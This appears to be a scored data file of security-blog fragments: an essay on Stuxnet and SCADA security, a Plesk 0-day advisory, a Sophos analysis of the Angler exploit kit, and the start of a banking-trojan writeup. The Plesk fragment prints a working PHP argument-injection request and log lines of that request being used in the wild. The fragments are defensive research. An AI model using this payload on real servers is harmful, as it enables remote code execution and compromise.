"Both companies (Realtek Semiconductor Corporation and Jmicron Technology Corporation), whose code signing certificates were used by Stuxnet, had offices in Hsinchu Science Park, Taiwan. That may suggest physical theft, but the certificates may have been bought from another source. For instance, the Zeus botnet was known to steal certificates, though its focus was on banking certificates. The file jmidebs.sys functions in much the same way as the earlier system drivers, injecting code into processes running on an infected machine. Maybe the attackers changed their certificate because the first one was exposed, or were simply using different certificates for different cyberattacks. Either way, they obviously had significant resources to draw on. The modular architecture that characterizes the Stuxnet malware suggests the involvement of a fairly large and well-organized group.",0.013404539293841333
"Tyger, Tyger – maeT regiT",0.010800575812195734
"Stuxnet has the hallmarks of a collaboration between several individuals or groups with specialist expertise – a (reverse) Tiger Team, if you like – yet its cover was blown by its promiscuous dissemination through the Autorun-like LNK vulnerability, a vector that automatically raised its chances of being detected heuristically. That may suggest the following …",0.010197805753104472
"A team where no-one had specific experience in the malware field. Maybe that’s understandable in a team put together under the auspices of a government or governments, if that’s really what happened.
Or the malware had already been so effective that staying under the radar wasn’t a major concern (the LNK version of Stuxnet was not the first version).
Or someone intended to send a message to Iran and the rest of the world about the capabilities of certain agencies and states. After all, much has been made of the “clues” in the code. However, even in 2016 I still haven’t seen conclusive evidence as to exactly who orchestrated that “message”, or planted those clues. Misdirection is a standard tool for diplomats and politicians, as well as for espionage.",0.014652768035966157
"Ironically, my own initial involvement with Stuxnet was partly due to being pulled into a hastily assembled US-based Tiger Team incorporating SCADA sites, law-enforcement, and one or two security vendors.",0.01373365481118527
"Some of the code looks as if it originated with a “regular” software developer with extensive knowledge of SCADA systems and/or Siemens control systems, rather than with the criminal gangs responsible for most malcode. Or, come to that, the freelance hacker groups – sometimes funded by governments and the military – we often associate with fully targeted attacks. Or was it a formally-constituted, multi-disciplinary “tiger team”.",0.013143586933003215
"On the other hand, wide propagation prevented the malware from remaining “below the radar”. This may signify misjudgment or a miscommunication at some point in the development process.",0.010960720805735624
"On yet another hand, it may simply mean that the group was familiar enough with the modus operandi characteristic of SCADA sites to gamble that Stuxnet would hit enough poorly-defended, poorly-patched and poorly-regulated PLCs to gain them the information and control they wanted. The clustering of infections in a country to which Western countries were reluctant to export, resulting in uneven (at best) licensing, may have had an impact on patches and updating.",0.012950156304183391
"Target, Target (… burning bright …)",0.013358521329052242
"Stuxnet at least suggested how much can be conceived and achieved using massive semi-targeted attacks. Why semi-targeted? Because while the payload is plainly focused on a control system, the malware’s propagation was promiscuous. Criminal (and nation-state funded) malware developers have generally moved away from the use of self-replicating malware towards trojans spread by other means (spammed URLs, PDFs and Microsoft Office documents compromised with zero-day exploits, and so on). Truly targeted and non-replicative malware (aimed at individuals, often using customized social engineering as well as customized code) is much harder to catch.",0.017222883018992663
Stuxnet’s usefulness in terms of payload delivery could have been depleted (a little nuclear joke there) by public awareness and the wider availability of protection.,0.012238953412929798
What was the real game-changer?,0.01367880714998515
"But what are the real implications behind the hypefest and the barrage of sheer speculation about who created it, and why? The real game-changer here is not the malware, interesting though it (still) is to specialists and the media alike, but what it says about its potential targets and the state of security before and after the attack became public knowledge.",0.015265340067333377
"It’s not the speculation about origin and targeting of the malware, or even the painstaking analysis of the binaries, but the way in which critical installations work, and their relationship with the wider world of security. What does it tell us about the state of CNI (Critical National Infrastructure) security, nationally and globally? Where does the security industry fit in a world of cyber-everything? (cyberespionage, cyberterrorism, cyberwarfare, cyberhysteria and other cyberbuzzwords.)",0.014777398927979024
The Target,0.008739998707147922
"There is evidence suggesting that equipment used for uranium enrichment in nuclear facilities was the original target. This paper, Did Stuxnet Take Out 1,000 Centrifuges at the Natanz Enrichment Plant?, by David Albright, Paul Brannan, and Christina Walrond, goes into a great deal of detail about the equipment, even if it’s inconclusive about exactly what Stuxnet did. There are lots of other relevant links at the Institute for Science and International Security web site (once you get past the Google ads). The equipment targeted by Stuxnet required a very specific configuration: a PC running Siemens WinnCC software connected to an S7 Simatic PLC equipped with specific CPUs, Profibus communications module(s), and a number of specific frequency converter drives operating at a speed of 807-1210 Hz.",0.01415496655256121
The Fantasy,0.008484594196424222
"This didn’t put a complete end to the speculation, of course. Sky News discovered that the Sky really is falling, claiming that the “super virus” is being traded on the black market and “could be used by terrorists”. In fact, given the amount of detailed analysis that’s already available, no-one with malicious intent and a smidgen of technical skill would need the original code (or rather the disassembled code that had already been around for quite a while) in order to make use of it.",0.014306976173510288
"However, it was suggested that possession of “the virus” in whatever form had alarming potential:",0.00776661514946575
"“You could shut down the police 999 system.”
“You could shut down hospital systems and equipment.”
“You could shut down power stations, you could shut down the transport network across the United Kingdom.”",0.014848364197093011
"These assertions clearly owed little to the PLC code actually discussed in competent analyses. While it might be possible to do all these things, that would require very extensive recoding and by now, a completely new set of zero-days.",0.010010438350502637
Changing the game,0.00910962902324719
"Less hysterically, Charles Jeter asserted that:",0.021737688550998113
"“The disruptive threat of Stuxnet is not found within the malware, it’s in the entire process and the proof of concept. This malware attack should be thought of as a template to an intelligence operation, not merely a scrap of software code.”",0.011297343916834457
"Ralph Langner asserted that: “The biggest collateral damage, however, emerges from the cost of dealing with post-Stuxnet malware, which copies attack technology from Stuxnet.”",0.014797118583688817
Is that really so? It depends on what kind of copycat code you’re expecting. Any anti-malware program should have been detecting the base code for over half a decade.,0.012256827908085355
"Earlier versions stayed under the radar for many months (maybe years in the first instance) because distribution was extremely limited, to an industry sector where tight anti-malware protection is not always seen as necessary or even possible. (Iran seems to have had particular problems arising from software import restrictions and licence enforcement.) But the versions that hit the headlines, though often described as targeted, while actually targeted in terms of the payload (what it did and where it activated), was much less so in terms of distribution. Hence the initially wide geographical dispersion of reported infections, though the clustering in Iran turned out to be highly suggestive.",0.014506062917771234
"For the security industry, the real challenges were in disentangling exactly what the malware did. Most AV companies don’t have ready access to specialist SCADA systems, or the specialist expertise to analyze the PLC code. And in any event the code doesn’t tell you everything about the target. At ESET, we concentrated more on analyzing the zero-day attacks, from which we learned a great deal. This is important because the bad guys also learned a lot.",0.01438081127182389
"Fortunately, you don’t have to know every detail of the payload to detect malware, but the complexity of the attack made detailed analysis very time consuming, where it was possible at all. While close analysis of such exploits isn’t usually necessary in order to detect specific malware, it does enable us to do a better job of developing generic and proactive detections that lessen the impact of future malware using similar attack techniques.",0.014537049269077507
Conclusion: The aftermath,0.009358322707635258
I was asked at the time:,0.012538295913133157
Do organizations and governments need to re-evaluate their security?,0.01628335093558586
"The only rational answer is ‘constantly’. But not just because of Stuxnet. The threat from direct re-use of Stuxnet SCADA-specific code in unrelated attacks (as opposed to more generic re-usable binary techniques) has been exaggerated – but sound security isn’t just a one-off implementation: it’s an ongoing process to which continuous review of security posture and risk assessment are integral. Evaluating and adapting (where necessary) to new risks, internal and external, is part of the process. That’s Security 101.",0.009657855584717434
What does Stuxnet mean for the computer security and control systems industry?,0.013513348494305966
"There are difficulties for some sites where protective measures may involve taking critical systems offline. While there are obvious concerns here concerning SPoFs (single points of failure), the potential problems associated with fixing such issues retrospectively should not be underestimated.",0.01101323906396312
"Stuxnet brought to light some problems with SCADA and ICS that aren’t necessarily directly relevant to Stuxnet’s own targeting. There are some scarily bright people in that space who understand both security and their own specialism very well, but there are also a lot of cut-rate installations relying on obsolescent control systems and security by obscurity. A critical installation doesn’t usually have direct connection to the internet, but infection is possible via connected systems that aren’t in themselves critical. Think USB, for a start. (The people behind Stuxnet did …)",0.011996032448210459
How has it affected governments and the military?,0.01398716463657168
"The kind of utility that Stuxnet appears to target is important, but there’s a lot more to a critical national infrastructure than nuclear reactors. The message is not so much that a nuclear program can be derailed (or at least impacted) by malware. (Though it remains a subject for debate as to how true this was of Bushehr or Natanz.) It’s that somebody thinks it’s worthwhile to put together teams to orchestrate attacks on critical sites using malware, rather than just hiring a few samurai to launch targeted attacks, as happened a great deal in the early noughties. The next such attack may be focused on a very different sector and use entirely different exploits. but it’s unlikely that there will never be another attack of this type, even if you believe Stuxnet was the first.",0.011786415024753194
Political and military strategists cannot ignore that potential.,0.01976335666571505
Do traditional perimeter defenses provide a complete answer to infrastructural attacks?,0.02193298749369932
"A year after Stuxnet, Luigi Auriemma found 30-50 vulnerabilities in four SCADA products made by Siemens, Iconics, 7-Technologies and Datac, some remotely exploitable. Since then, it’s become increasingly common for researchers to disclose vulnerabilities only to subscribers to their audit (and other) services. Well, I guess we all have to make a living … Bottom line: you don’t have to be a specialist to start finding holes, and infrastructural weaknesses continue to be reported on specialist lists.",0.01152591095772515
SCADA pain points,0.008271525106937294
"Critical control systems are often left unpatched, either because it is difficult to fully test the patch and ensure that it will not affect normal operations, or, in the case of systems not connected to the internet, because it’s assumed that those systems are not subject to outside influence and are therefore protected. Industrial controls engineer Jake Brodsky made some very pertinent comments in response to a blog article I wrote at the time.",0.011841330918447635
"While agreeing that strategically, Siemens were misguided to keep hardcoding the same access account and password into the products in question, and naive in expecting those details to stay secret, Jake pointed out, perfectly reasonably, that tactically, it would be impractical for many sites to take appropriate remedial measures without a great deal of preparation, recognizing that a critical system can’t be taken down without implementing interim maintenance measures. He suggested, therefore, that isolation of affected systems from the network was likely to be a better short-term measure, combined with the interim measures suggested by Microsoft for working around the .LNK and .PIF issues that were causing concern at the time.",0.010024710645888946
"Additionally, after it was discovered that Stuxnet was exploiting default passwords, the SCADA system vendor issued guidance to its customers requesting that they refrain from changing default passwords because they were hard-coded into the products and could cause their systems to fail if changed. This recommendation contradicted the traditional practice of changing default passwords upon installation of commercial products.",0.010113440596948076
"Security practitioners in that space found themselves in the challenging position of having to decide which risk was greater, knowing that either option could cause significant service outages to critical systems. Of course, practitioners in other spaces that aren’t considered to be SCADA – some healthcare facilities for instance – find themselves uncomfortably perched on similar dilemmas.",0.01378527642645233
Future Shock,0.009760394078065393
"Everything is connected, directly or indirectly. Issues like power failures and maintenance problems on infected sites generally generate more heat than light in terms of PR exposure. But of course a maliciously engineered disaster is entirely possible. Otherwise, a lot of movie scriptwriters and security prognosticators would be out of work.",0.013063674413758442
"Organizations need to continuously re-evaluate baseline controls. Computers not connected to the internet do not usually operate in a complete vacuum. We cannot ignore the potential consequences of an attack that can traverse the air gap to segmented networks.
",0.0186118742700766
Plesk 0-day Remote Vulnerability in the Wild,0.005701551696527862
"Just last week another 0-day vulnerability on Plesk was released. It affects Plesk 9.2, 9.3 and 9.5.4 versions. If you have not yet, we recommend that you update Plesk immediately.
Note: In our latest analysis of servers with the Apache binaries or modules compromised (DarkLeech or Cdorked.A), Plesk is often one of the entry points.
Technical Analysis
The exploit was released last week by Kingcope with a sample exploit to “test” if a server is vulnerable. The vulnerability comes from this Plesk configuration:",0.009224808839547904
scriptAlias /phppath/ “/usr/bin/”,0.008542355628159082
"This allows any one to execute the PHP interpreter. Upon calling the PHP binary, they can pass commands very similarly to the CVE-2012-1823 (PHP CGI bug):",0.007082722148124332
/phppath/php?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=””+-d+open_basedir=none+-d+auto_prepend_file=php://input+-n,0.012494952704313556
"This permits the attackers to inject and run any command as the user Apache. Due to the severity, we either recommend removing the vulnerable configuration (grep for phppath) or updating to the latest version of Plesk.
In the wild
And yes, we are seeing this vulnerability being probed in the wild already, either by searching for phppath/php or already trying to exploit it:",0.005790034011259326
"80.248.x.y – – [10/Jun/2013:23:58:29 -0400] “GET /phppath/php HTTP/1.1” 302 154 “-” “libwww-perl/5.813”
91.224.x.y – – [10/Jun/2013:23:59:58 -0400] “POST /phppath/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2f%2finput+-n HTTP/1.1”
.. along with many other requests for similar files",0.01164205264683138
"We will update with more details as we keep tracking this vulnerability.
",0.012101620072123231
A closer look at the Angler exploit kit,0.008966231221990695
SophosLabs Uncut•Threat Research•Angler•Drive-by downloads•Exploit kits,0.009274889752264981
An in-depth look at one of the more notorious exploit kits used to facilitate drive-by downloads,0.008044949632973752
"Written by
Fraser Howard",0.009895127539591209
"July 21, 2015",0.008510348357897768
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
17,0.014677742533125038
"Over the past few years exploit kits have been widely adopted by criminals looking to infect users with malware. They are used in a process known as a drive-by download, which invisibly directs a user’s browser to a malicious website that hosts an exploit kit.
The exploit kit then proceeds to exploit security holes, known as vulnerabilities, in order to infect the user with malware. The entire process can occur completely invisibly, requiring no user action.
In this research article we will take a closer look at one of the more notorious exploit kits used to facilitate drive-by downloads – a kit known as Angler exploit kit (Angler hereafter).
1 Introduction
Angler first appeared in late 2013, and since then has significantly grown in popularity in the cyberunderworld. Its aggressive tactics for evading detection by security products have resulted in numerous variations of the various components it uses (HTML, JavaScript, Flash, Silverlight, Java and more). Angler is also extremely prevalent. For example, in May 2015, we uncovered thousands of new web pages booby-trapped with Angler – so-called landing pages – every day.
The weekly volume of Angler related detections since mid-2014 shows a burst of activity in late 2014, followed by a slight lull, and then increased activity from March 2015 onwards:
Figure 1: Growth of Angler exploit kit measured by weekly detection volume.
Since the demise of the Blackhole exploit kit in October 2013, when its alleged operators were arrested, other exploit kits have certainly flourished and shared the marketplace, but Angler has begun to dominate. To show Angler’s prevalence against other exploit kits, we analyzed a snapshot of activity for three different periods (September 2014, January 2015 and May 2015):
Figure 2: Distribution of exploit kit activity as measured by detection telemetry based on a week’s worth of data in September 2014, January 2015 and May 2015.
2 Traffic Control
Clearly, the success of any exploit kit lies in its ability to exploit its target computers and successfully install malware. But exploits kits also need a good volume of incoming traffic in order to have a steady stream of potential victims to infect. For most drive-by downloads, this is achieved by hacking into legitimate websites and injecting malicious HTML or JavaScript into their content. The higher the profile and popularity of the victim web site, the greater the volume of traffic that will be fed to the exploit kit.
We have seen a variety of tricks used to send user web traffic to Angler. Many of them involve simple IFRAME (inline HTML frame) injection using added HTML or JavaScript, and are not particularly interesting. However, some of the redirection methods used with Angler are a bit more unusual and warrant a mention here.
2.1 HTTP POST redirection
Above, I indicated that typical redirections are invisible to the user. Actually this is not always the case, as illustrated with the first example, taken from May 2014. We saw a huge number of legitimate sites injected with a combination of JavaScript and HTML, as shown below. In contrast to typical injections, this one involved the addition of FORM and DIV elements in addition to some JavaScript:
Figure 3: Injected JavaScript and HTML (detected as Troj/JSRedir-OA)
Upon loading the page, the user is presented with a dialog box, prompting them to click either “Yes” or “Cancel”. As evident from the injected Javascript, whichever is clicked, the Go() function is run, which removes the popup, adds an IFRAME placeholder, and then submits the form:
Figure 4: Popup displayed when user browses site injected with Troj/JSRedir-OA.
The data sent in the form submission includes three values (encoded), presumably to assist the criminals managing this redirection mechanism:",0.023355544846726528
"IP address
User-Agent string
URL",0.008796909144063725
"The response to the form POST is further HTML and Javascript (loaded into the IFRAME placeholder), which redirects the user: .
Figure 5: Response from the HTTP POST containing JavaScript to initiate the redirect.
A few months later we saw a similar technique being used, but this time with a Flash component. The compromised web pages were modified to include HTML that loaded a malicious Flash file from yet another compromised site.
ActionScript within the Flash file would then retrieve the various parameters and issue the HTTP POST request.
Figure 6: ActionScript used in Flash version of Troj/JSRedir-OA.
The response to the HTTP POST was like before (Figure 5), with HTML and JavaScript sent back to redirect the user. Interestingly, in early 2015 we saw this latter redirection technique also being used to send traffic to the Nuclear exploit kit.
2.2 Domain generation algorithm
Another trick we have seen used in Angler redirects is the use of domain generation algorithms (DGAs). In 2014, many legitimate web pages were injected with JavaScript that added a script element to load content from a remote site with a hostname that was computer based on a hash of the current date. The idea is that the domain name changes every day, but the malicious script does not need to contain a long list of future names. These DGA redirects were seen using both .EU and .PW domain names.
Figure 7: Snippet of code from injected JavaScript redirect using DGA (Troj/JSRedir-OE).
The downside of this type of redirect is that once the algorithm is known, the security community can predict the target hostname on any particular date, and can blocklist it, effectively shutting down the attack.
2.3 HTTP redirects
The final example included in this section illustrates the use of web redirects using the HTTP response code 302, commonly used on legitimate sites to divert visitors elsewhere. This involves straightforward content injection, but with an additional link in the redirect chain. In late April 2015, we noticed that users browsing the eHow web site were being redirected to Angler. Analysis of the traffic revealed the redirection steps illustrated in Figure 8.
JavaScript had been inserted into one of the legitimate libraries on ehowcdn.com to load content from what looked to be an Optimizely server. (Optimizely provides website analytics services, frequently used to assess web advertising effectiveness.) However, note the additional “s” at the end of the hostname to give optimizelys.com instead of the legitimate optimizely.com.
Figure 8: Overview of recent redirection masquerading as Optimizely hack.1: web page on eHow site, 2: script on ehowcdn.com which loads script from optimizelys.com, 3: script adds malicious iframe, 4: 302 bounce to the Angler landing page.
Within days of observing this, we received other reports of identical redirection (cdn3.optimizelys.com again) being used from other sites – this time the final target being the Nuclear exploit kit.
3 Exploit Kit
3.1 Landing page
The landing page is the starting point for the exploit kit code. Typically it uses a mixture of HTML and JavaScript content to identify the visitor’s browser and the plugins installed, so that the exploit kit can choose the attack most likely to result in a drive-by download.
A variety of obfuscation techniques have been used in the Angler landing pages since the first appearance of the kit. Aside from making analysis more awkward, these techniques make it easier for the criminals to dynamically build unique content on each request, in an attempt to evade detection by security products. For the past year or so, Angler has been encoding its main script functionality as data strings stored in the parent HTML. This content is then retrieved and decoded when the landing page is loaded by the browser. This is a common and well established anti-emulation technique used by numerous malicious threats.
Decoding the outermost obfuscation layer reveals the next trick used by Angler – anti-sandbox checks. It uses the XMLDOM functionality in Internet Explorer to determine information about files present on the local system. It does this in order to detect the presence of various security tools and virtualization products:
Figure 9: Snippet of code from Angler landing page showing code to check for the presence of various security tools and virtualization products.
Beneath the anti-sandbox checks is a second obfuscation layer. A function is called to convert several long strings into Unicode (double-byte) data, some of which is actually script content later added to the page. In most cases, this will be more JavaScript, but sometimes (specifically when CVE-2013-2551 is targeted) there will be VBScript content as well:
Figure 10: Second obfuscation layer, hiding shellcode data and additional script content that is added to the page (in this case CVE-2013-2551 is targeted, so both JS and VBS content is added).
The added script content will be specific to the particular vulnerabilities targeted in any version of the landing page. In all cases however, the added scripts will contain code to:",0.02482562126568877
"Dynamically construct shellcode.
Retrieve data from an array in the Angler landing page (see below).",0.0164083005098683
"Angler landing pages contain an array of encoded strings, each of which is decoded by a simple substitution cipher provided by a JavaScript function in the decoded page. (Occasionally the encoded strings are stored in a sequence of variables, but an array is more common.) The key used in the cipher is typically the first member of that array (uhBNwdr[0] below):
Figure 11: Substitution cipher used in Angler landing page.
The size and content of this array will vary according to the vulnerabilities targeted in that version of the kit. Examples of the data stored in the array include:",0.010520720420587826
"The name of the server hosting the exploit kit.
Folder used to locate Silverlight content
Folder used to locate Flash content
Payload URLs.
Flash payload string (encoded shellcode or URL data).",0.011750389292183305
"This data is retrieved and decoded as necessary. Here, you can see the relevant payload string being incorporated into the dynamically generated shellcode:
Figure 12: JavaScript function to build unicode string later decoded by shellcode upon exploitation of CVE-2014-6332. The function includes the payload URL and payload decryption key.
The code to load the malicious Flash component is straightforward. Assuming the anti-sandbox checks are passed, three characteristically named (get*) functions are used to retrieve and decode strings from the landing page. These are then used to build the HTML object element, which is added to the document:
Figure 13: Angler landing page code that is used to load malicious Flash content.
3.2 Flash content
Angler’s Flash content has varied considerably over the past year. The samples are routinely obfuscated using various techniques, including:",0.015382209617356257
"ActionScript string obfuscation techniques.
Base64 encoding.
RC4 encryption.
Commercial Flash obfuscation/protection tools (e.g. DoSWF and secureSWF).",0.017021992149973464
"An additional complication is Angler using embedded Flash objects. The initial Flash loaded from the landing page is fairly innocuous, serving merely as a loader to deliver the exploit via an inner Flash. The inner Flash may be carried as a binaryData object or encoded as a string within the ActionScript. In either case, the data will be encrypted using RC4. An example from January 2015 looks like this:
Figure 14: Outermost Flash carries inner Flash encrypted with RC4 and Base64 encoded.
Data is passed from the landing page to Flash via the use of a FlashVars parameter in the landing page HTML – a common technique in recent exploit kits.
This is easily accessible from ActionScript via the parameters property of the loaderInfo object. This mechanism has been well used in many exploit kits in order to:",0.014226754268408803
"Pass in payload URL data.
Pass in shellcode.",0.012740000729423273
"This flexibility enables dynamic customization of shellcode without having to recompile the Flash itself.
Figure 15 shows snippets of the ActionScript used in recent Angler Flash objects to retrieve the encoded data from the landing page (“exec” variable). Additionally, you can see the use of control flow obfuscation in some of the functions involved, complicating analysis:
Figure 15: Retrieving encoded data from the landing page (“exec” variable) which is then decoded by an ActionScript function.
In early 2015, there was a succession of zero-day vulnerabilities (including CVE-2015-0310, CVE-2015-0311, CVE-2015-0313, CVE-2015-0315, CVE-2015-0336, CVE-2015-0359) in Adobe Flash Player, which were quickly targeted by Angler. The targeting of these vulnerabilities by Angler (and other exploit kits) has been well described elsewhere.
This flurry of Flash activity supports the trend away from Java exploitation over the past 18 months, a change that was kickstarted when Oracle blocked the use of unsigned browser applets by default in Java 7 update 51.
3.3 Shellcode analysis
As noted above, the shellcode is dynamically generated within the script when the landing page is loaded by the browser. The exact contents of the shellcode will vary according to the vulnerability being targeted, but in all cases the encoding and structure is similar. The analysis below describes the shellcode that is used in exploiting CVE-2014-6332.
On first sight it was evident that the shellcode data (shellcode_part1, shellcode_part2 and shellcode_part3 in Figures 10 and 12) did not seem to contain valid code. Closer inspection revealed why – additional code is added to the start of the shellcode from the VBScript component. The JavaScript build_shellcode() function in Figure 12 is actually called from the VBScript (Figure 16).
Figure 16: Snippet of the VBScript code used to construct the shellcodeused in CVE-2014-6332 exploitation.
Sure enough, analysis of the additional Unicode data provided from the VBScript (buildshell1 in Figure 16) confirms it is executable code, and actually contains a small decryption loop to decrypt the bytes contained in remainder of the shellcode, which includes the payload URL and decryption key. This decryption loop reverses the encData() function referenced in Figure 12, where the payload URL and payload key were encrypted.
Figure 17: Snippet of shellcode illustrating the decryption loop provided by the VBScript.
Inspection of another landing page sample, this time one targeting CVE-2013-2551, shows the same technique, but this time, the decryption loop is added within the JavaScript:
Figure 18: Snippet of JavaScript showing the same shellcode decryption loop as in Figure 17.
After this loop completes, the main shellcode body is decoded and can be analyzed.
After resolving the base address for kernel32, the shellcode parses the export address table to find the functions it requires (identified by hash). It then uses LoadLibraryA API to load winhttp.dll, and parses those exports to find the functions it needs:",0.01919914531503919
"Module
Functions (imported by hash reference)",0.013947179602389448
"kernel32.dll
CreateThread, WaitForSingleObject, LoadLibraryA, VirtualAlloc, CreateProcessInternalW, GetTempPathW, GetTempFileNameW, WriteFile, CreateFile, CloseHandle",0.01883586809380655
"winhttp.dll
WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryDataAvailable, WinHttpReadData, WinHttpCrackUrl, WinHttpQueryHeaders, WinHttpGetIeProxyConfigForCurrentUser, WinHttpGetProxyForUrl, winHttpSetOption, WinHttpCloseHandle",0.022475739787028548
"If the exploit works, then the payload is downloaded and decrypted by the shellcode, using the aforementioned key. Angler uses different keys according to the exploitation path (Internet Explorer, Flash, Silverlight – at least two keys for each are currently known).
After decrypting the payload, the shellcode checks the header to identify if the payload is yet more shellcode (which starts with do-nothing NOP instructions at the start) or a Windows program (which starts with the identifying text string “MZ” at the start):
Figure 19: Logic in shellcode to check payload type.
If the decrypted payload is a program, it will be saved and run. If it is a second stage of shellcode, the final executable payload is embedded within the body of the shellcode (sometimes in both 32-bit and 64-bit versions).
When the second-stage shellcode runs, the payload is inserted directly into memory in the process of the exploited application, without first being written to disk. This “no-file” characteristic is responsible for some of the notoriety that Angler has recently gained. This mechanism has been used to infect users with malware from the Bedep family, which itself provides the ability for an attacker to download yet more malwares.
4 Network Perspective
In this section, we will switch focus from content analysis to a look at Angler activity from a network perspective.
4.1 Fresh registrations
As with most web attacks, Angler makes liberal use of fresh domain registrations.
As is typical for drive-by downloads, we usually see a flurry of registrations that resolve to the same IP number for a short period.
Occasionally, Angler has used free dynamic DNS services, a tactic widely used by exploit kits for years.
4.2 Domain shadowing
Angler has made aggressive use of hacked DNS records as well, a technique used by attackers for several years that is becoming popular once again. The criminals update the DNS records of legitimate domains, adding multiple sub-domains that direct to the malicious exploit kit – a technique sometimes called domain shadowing.
An example is shown in Figure 20, based on some activity seen in May 2015. In these attacks, a 2-level technique is used, where the DNS records have been updated to include wildcard entries (*.foo.example.com, *.bar.example.com). So in this attack, the records were updates with entries including:",0.01865465679245437
"*.bro.directorsinstitute.net
*.fer.directorsinstitute.org",0.012281159204272418
"This enables the attackers to resolve their shadowed domains to the malicious IP, a computer hosted in Russia at the time of writing. As you can see, the specific sub-sub-domains used in the Angler redirects appear to be six-character strings, presumably chosen to let the attackers track and attribute incoming traffic (most likely for statistics and payment).
Figure 20: Domain shadowing (two-level sub-domains) used by Angler (May 2015).
In other cases, we have seen Angler using single-level DNS hacks:
Figure 21: Domain shadowing (single-level sub-domains) used by Angler (May 2015).
In some cases the string used in the sub-domain appears to have some relevance to the domain name being shadowed. This suggests human involvement, rather than random text generated by a program.
Domain shadowing relies on the criminals being able to modify legitimate DNS records, which is most likely due to stolen credentials. Site owners do not necessarily understand the critical nature of their DNS records, so it is concerning that many of the providers/registrars do not guard the DNS configuration more closely.
Most site owners will rarely need to update the records, so any updates should ideally be protected by more than user credentials. Suggestions to improve this situation include:",0.015595433990830965
"Implement two-factor authentication.
Send email notifications after DNS changes.",0.015709438107999074
"Thanks to collaboration with researchers at Nominet, we have been able to look more closely into the domain shadowing activity used in Angler attacks. The intention was to reveal the timeline of events upon a DNS record being hacked. We focused on the DNS query activity for a number of domains associated with a single compromised user account where attackers were using two-level domain shadowing (as in Figure 20).
Figure 22 illustrates a snapshot of DNS query activity for 26 February 2015. Data for three domains (all within the same compromised user account) is included. Green circles show the overall query volume; purple squares highlight above-average query volumes; and the white circles denote periods of sharply-increased query volume, when the attackers started actively using these domains for Angler traffic.
Figure 22: Timeline of DNS query activity on Feb 26th 2015 for three domains.
This data reveals two stages in the attack. First, the criminals tested the hacked DNS records with a modest number of queries at 10am. These queries were for the single-level sub-domain, (foo.domain.co.uk), and were all from the same source.
Once the criminals are happy their newly-stolen domain names are resolving reliably, we see bursts of malicious Angler traffic using the two-level sub-domain. In figure 22 you can visualize the attackers cycling through the different domains, with each one being active only for a short period. This correlates nicely with our detection telemetry, where we see similar bursts of activity per hostname.
This information gives us a better impression of the infrastructure and management used to control user web traffic for the purpose of redirecting it to malicious sites.
4.3 URL structure
The URL structure used for the various components of a drive-by attack can often be useful in identifying malicious activity in amongst user web traffic. Historically, certain exploit kits have used predictable URL structure for different components, making it easier for security providers to detect and block content. Some examples from the Nuclear and Blackhole exploit kits include:",0.022091407407573205
"Timestamps as filenames.
Hashes used in file and folder names.
Characteristic text in the query part of URLs.",0.012464511011980761
"Similar weakness were present in early versions of Angler as well, but the kit has evolved significantly since then, taking steps to remove any Achilles heel that might have been easy to spot in the URLs used for its various components.
5 Payloads
The final section of this article aims to provide an overview of the actual malware being installed through Angler. To investigate this, we analyzed payloads for a 4-week period during April 2015.
As you can see, all the payloads collected during this period were delivered by exploits against Internet Explorer (59%) or Flash (41%):
Figure 23: Exploits used to deliver Angler payloads during April 2015.
This matches our data for recent Angler landing pages, where we have not seen exploits against Silverlight or Java. However, these results are determined as much by the victims’ computer configurations as by Angler itself, because Angler avoids trying exploits against components that are not installed.
The malware families installed in these drive-by downloads were as follows:
Figure 24: Malware families installed by Angler in April 2015.
Clearly there is a ransomware focus here – the names tagged with asterisks are ransomware families, and account for more than 50% of the malware attacks. The most common ransomware was Teslacrypt.
6 Summary
In this research article we have taken a top-to-bottom look at the Angler exploit kit, highlighting some of the methods used to ramp up traffic to Angler-infected web pages.
Understanding this behavior end-to-end is vital when providing protection. Angler attempts to evade detection at every level. To evade reputation filtering it switches hostnames and IP numbers rapidly, as well as using domain shadowing to piggyback on legitimate domains. To evade content detection, the components involved in Angler are dynamically generated for each potential victim, using a variety of encoding and encryption techniques. Finally, Angler uses obfuscation and anti-sandbox tricks to frustrate the collection and analysis of samples.
As illustrated above, Angler has risen above its competitors in recent months. This could be down to many factors: higher traffic to Angler-infected pages; exploits with a better hit-rate in delivering malware; slicker marketing amongst the criminal fraternity; more attractive pricing – in other words, good returns for the criminals who are buying “pay-per-install” malware services from the team behind Angler.
One thing is clear: Angler has a serious impact on anyone browsing the web today.
7 Acknowledgments
We commend the work done by everyone in the security community to track exploit kit activity. In preparing this article, however, we would like to give individual hat-tips to @kafeine and @EKwatcher.
Thanks also to Richard Cohen and Andrew O’Donnell of SophosLabs for their work on the shellcode components.
Thanks to Ben Taylor, Sion Lloyd and Roy Arends of Nominet for their insights into DNS domain shadowing.",0.01747257877020081
"DEEP LEARNING FOR DEEPER CYBERSECURITY  Watch Video
",0.011176153783902576
"Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites
Win32/Aibatook targets Japanese bank customers with an unusual Internet Explorer monitoring technique. We believe the malware has been in development for months - and is now ready for take-off.",0.013255731139628857
16 Jul 2014 - 11:41AM,0.010795063151242124
Win32/Aibatook targets Japanese bank customers with an unusual Internet Explorer monitoring technique. We believe the malware has been in development for months – and is now ready for take-off.,0.01265831067763501
Introduction,0.012036720276026314
"This blog post will explore a malware family named Win32/Aibatook, which targets Japanese users’ banking information and hosting providers’ account credentials. It appeared at the end of 2013 and a previous version has already been documented by Symantec, which has even sinkholed some of Win32/Aibatook’s C&C servers. Far from being discouraged, the operators have since published an updated version and moved from Delphi to C++ as their programming language. This post will focus on this new strain, which came out in April 2014 and has some interesting quirks:",0.012690691444871116
"Propagation of the malware is made through a custom exploitation chain placed on compromised websites
It only targets Internet Explorer, using an unusual technique to steal personal information
Two different implementations of the information-stealing logic are deployed; the first one is specifically tailored against two major Japanese banks, whereas the second one is more flexible and currently used to target around 90 Japanese websites",0.0152162545076312
"We will first describe the most recent propagation method of Win32/Aibatook, and then its actual functionalities and their implementation",0.008954635149652668
Propagation,0.007982926605209606
